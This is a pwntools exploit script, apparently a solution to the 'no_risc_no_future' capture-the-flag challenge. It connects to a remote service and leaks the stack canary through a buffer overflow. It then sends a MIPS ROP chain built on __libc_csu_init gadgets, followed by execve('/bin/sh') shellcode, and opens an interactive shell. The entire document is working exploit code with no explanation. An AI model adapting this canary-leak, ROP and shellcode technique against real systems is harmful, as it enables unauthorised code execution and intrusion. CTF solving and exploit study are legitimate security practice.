from pwn import *

def p32_big(data):
    return(p32(data,endian='big'))
#https://github.com/w0lfzhang/mips_exploit/blob/master/rop/rop.py
#r=process('./no_risc_no_future')
r=remote('noriscnofuture.forfuture.fluxfingers.net',1338)
e=ELF('./no_risc_no_future')
csu_init=0x400f04
csu_init60=0x400f24
shellcode=b"bi\t<//)5\xf4\xff\xa9\xafsh\t<n/)5\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd'  \xa0\x03\xfc\xff\xa0\xaf\xfc\xff\xbd'\xff\xff\x06(\xfc\xff\xa6\xaf\xfc\xff\xbd# 0\xa0\x03sh\t4\xfc\xff\xa9\xaf\xfc\xff\xbd'\xff\xff\x05(\xfc\xff\xa5\xaf\xfc\xff\xbd#\xfb\xff\x19$'( \x03 (\xbd\x00\xfc\xff\xa5\xaf\xfc\xff\xbd# (\xa0\x03\xab\x0f\x024\x0c\x01\x01\x01"
nop='\x28\x06\xff\xff'
r.send('A'*64+'B')
r.recvuntil('B')
canary=u32('\x00'+r.recvuntil('\n').replace('\n',''),endian='big')
log.info(hex(canary))
for i in range(8):
    sleep(1)
    r.send('A'*64+'B')
s0=0x490394
s1=0
s2=0
s3=e.bss()+0x100
s4=300
s5=1
ra=csu_init
payload=b'A'*64+p32_big(canary)
payload+=p32(0xdeadbeef)+p32(csu_init60)
payload+='a'*0x1c
payload+=p32(s0)+p32(s1)+p32(s2)+p32(s3)+p32(s4)+p32(s5)+p32(ra)
payload+='a'*52+p32(s3)
r.send(payload)
r.recvline()
log.info(len(payload))
log.info(len(shellcode))
sleep(1)
r.send(shellcode)
r.interactive()
